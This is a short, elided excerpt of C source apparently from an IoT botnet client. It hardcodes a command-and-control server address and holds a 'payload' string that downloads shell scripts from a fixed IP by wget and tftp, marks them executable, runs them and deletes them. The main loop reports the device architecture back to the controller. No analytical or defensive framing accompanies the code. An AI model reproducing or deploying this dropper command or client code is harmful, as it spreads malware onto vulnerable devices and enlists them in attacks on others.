...
unsigned char *commServer[] = { "37.10.71.140:23" };

char *payload = "cd /tmp; wget http://173.232.146.226/bins.sh; chmod 777 *; sh bins.sh; tftp -g 173.232.146.226 -r tftp.sh; chmod 777 *; sh tftp.sh; rm -rf *.sh";
...
int main(int argc, unsigned char *argv[]) {
        ...
        while(1) {
				...
				sockprintf(mainCommSock, "arch %s", getBuild());
